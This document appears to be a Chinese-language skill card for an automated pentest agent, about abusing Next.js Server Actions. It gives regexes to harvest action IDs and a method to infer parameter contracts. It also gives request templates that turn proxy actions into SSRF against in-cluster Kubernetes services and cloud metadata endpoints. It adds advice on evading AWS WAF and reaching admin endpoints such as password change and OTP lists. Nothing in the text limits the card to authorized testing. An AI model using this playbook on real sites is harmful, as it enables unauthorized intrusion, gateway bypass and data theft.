---
name: nextjs-server-action-abuse
description: "Next.js Server Actions: enum, invoke, BFF SSRF."
---

# Next.js Server Action 滥用（不需要 CVE）

## 何时用

- 站点是 Next.js App Router（`?_rsc=`、`RSC: 1` → `text/x-component`、`self.__next_f`）
- 前端 bundle 里能搜到 `createServerReference("<40位十六进制>")`
- React2Shell 家族被 WAF/补丁挡住，需要换一条**不受版本影响**的路
- 站内有自研的「服务端转发」函数（名字常是 `serverRequest` / `proxyRequest` / `requestProxy`）

## 为什么优先于 React2Shell

Server Action 是**业务逻辑本身**，不是反序列化 gadget：

- 不受 React/Next 版本补丁影响（2026 的 Turbopack 构建照样暴露）
- 不需要构造 `$1:constructor:constructor` 这类签名，**不撞语义型 WAF**
- 入参完全由调用方决定，而函数体内**普遍不校验调用者身份**

所以：指纹确认 App Router 后，**先跑本卡，再考虑 CVE**。

## 三步法

### 1. 枚举 action ID

```python
re.finditer(r'createServerReference\)?\(["\']([0-9a-f]{40,})["\']', chunk)
```

GET 首页 → 抠 `/_next/static/chunks/*.js` → 逐个下 → 正则。

**只看裸 ID 没用，必须看上下文 ±400 字符里的模块导出名**，才知道哪个 ID 对应哪个函数：

```python
ctx = chunk[max(0, m.start()-400): m.start()+400]
if "serverRequest" in ctx: found["serverRequest"] = m.group(1)
```

懒加载 chunk（`LoginPage-xxxx`、`JobConfiguration-xxxx`）里的 action 尤其值钱。

### 2. 反推参数契约（关键，别猜）

在**所有 chunk 里搜该函数的调用点**，调用方写死的 object 字面量就是契约：

```js
(0,r.serverRequest)({options:{url:"http://svc.default.svc.cluster.local/x",
                              method:"GET", params:{typeCode:e}, noCache:!0}})
```

这一步同时回答两个问题：参数长什么样、**这个函数是不是 SSRF**。
比对着报错一个个试参数快十倍。

### 3. 调用

```
POST /<任意页面路由>                # 不是 /api/*，action 挂在页面路由上
Next-Action: <40位id>
Content-Type: text/plain;charset=UTF-8
Accept: text/x-component
Origin / Referer: 同站

[{"options":{"url":"http://target/","method":"GET","params":{}}}]
```

body 是**参数数组的 JSON**（一个对象参数就是 `[{...}]`）。

响应是 RSC flight 流：

```
0:{"a":"$@1","f":"","q":"","i":false,"b":"..."}
1:E{"digest":"1384047122"}
```

**语义：**

| 响应 | 含义 |
|---|---|
| `1:E{"digest":N}` | **action 真跑完了**，内部 fetch 抛异常（不是没进去） |
| digest 值变化 | 不同错误点 → 可当 oracle 分层 |
| `0:...$@1` + 正常 JSON | 打通，数据在后续行 |
| `Server action not found.` 404 | action 不存在（ID 过期/换版本） |

## ★ 两大致命假阴性（本卡最重要，各能浪费半天）

### (a) 必须先 warm-up GET 一次

裸 POST action、不带会话时，Next 会**先渲染页面**，页面里的 region/config 拉取一挂就返回
`500 <纯文字错误>`（实测 `Failed to fetch regions`），**看起来像整站宕机，其实只是缺 cookie**。

```python
S = requests.Session()
S.get(B + "/en-my")          # ← 没有这一行，后面全 500
S.post(B + "/en-my", headers={"Next-Action": AID}, data=json.dumps(args))
```

### (b) 站「抽风」多半是假象

同一时刻 GET 首页 12/12 全 200、POST action 全 500 —— 挂的是 **action 那条代码路径**
（会话/依赖），不是站点。

**判别**：先连打 10 次 GET 首页看成功率。全 200 就不要怀疑站点，去查自己的 session/headers。

## BFF 型 action = 集群内 SSRF（本卡的兑现点）

凡是有 `serverRequest({options:{url,method,params,data}})` 这种自研转发函数的站，
等于把「任意 URL + 任意 method + 任意 body」的服务端请求能力开放给匿名调用方。

实测一发就漏出内网域名：`wtlb-gateway-service.default.svc.cluster.local`。

**为什么这比普通 SSRF 值钱：**

```
外部 → WAF → 网关（按 oauth2 client 分域，低权 token 一律 999970）→ 服务
内部 → SSRF 直连 <app>-<svc>-service.default.svc.cluster.local → 服务（没有网关，没有 client 校验）
```

集群内服务之间通常不做鉴权 —— **这正好从背面绕过网关那堵 `Invalid oauth2 client id` 的墙**。

打法：按命名规律点服务名（`<app>-usr-service` / `<app>-job-service` / `<app>-ply-service`…
或 `<svc>-service` / `<app>-<svc>` 几种变体），用 `/v3/api-docs` 或 `/actuator/health`
这种小响应探活；命中后直接打后台端点（改密、OTP 列表、定时任务创建）。

云元数据同理：`169.254.169.254` / `100.100.100.200`（阿里）/ `metadata.google.internal`。

## AWS WAF Bot Control（别当成 Cloudflare）

响应体出现 `window.awsWafCookieDomainList` / `window.gokuProps` / 标题 `Human Verification`
→ **AWS WAF**，常返回 **405**（不是 403，容易误判成 method 错）。

| 拦 | 放 |
|---|---|
| IP 字面量 `10.*` / `127.0.0.1` / `169.254.169.254` / `100.100.100.200`，含十进制变形 `1684301000` | **k8s 服务名 `*.svc.cluster.local`** |
| 绕过域 `nip.io` / `sslip.io` / `xip.io` | 普通外链域名 |
| 路径关键字 `meta-data` | 普通路径 |

**被挑战后本出口 IP 报废**：冷却数分钟 + 降到 ~8s/发 才恢复。
实测 18 连发里前 12 发全 200、第 13 发起被挑战 —— **是自己把 IP 打热的，不是站点挂了**。
别用连发去「试」窗口；要抢窗口就写低频轮询（20s+ 间隔）。

## 成功口径

| 级别 | 口径 |
|---|---|
| L1 | 枚举到 action ID + 反推出参数契约 |
| L2 | 无会话调通一个业务 action（拿到数据）|
| L3 | `serverRequest` 打通内网服务或云元数据 |

## 不要做

- 别把 action POST 的 500 当「站死了/打不动」—— 先 warm-up GET 再说
- 别只枚举 ID 不反推契约就开始猜参数
- 别拿 `nip.io` 这类绕过域去打 AWS WAF（已被专门收录），**用 k8s 服务名**
- 别用高频连发抢窗口（会把出口 IP 打废，比慢更亏）

## 参考

- `scripts/sa_enum.py` —— 可直接跑：枚举 action ID（带上下文命名）→ warm-up → 按契约调用 → 打印 RSC 语义
- 相邻卡：`nextjs-ssr-hunt`（React2Shell/CVE 家族）、`gateway-partition-authz-sweep`（网关分区/999970/后台 client）
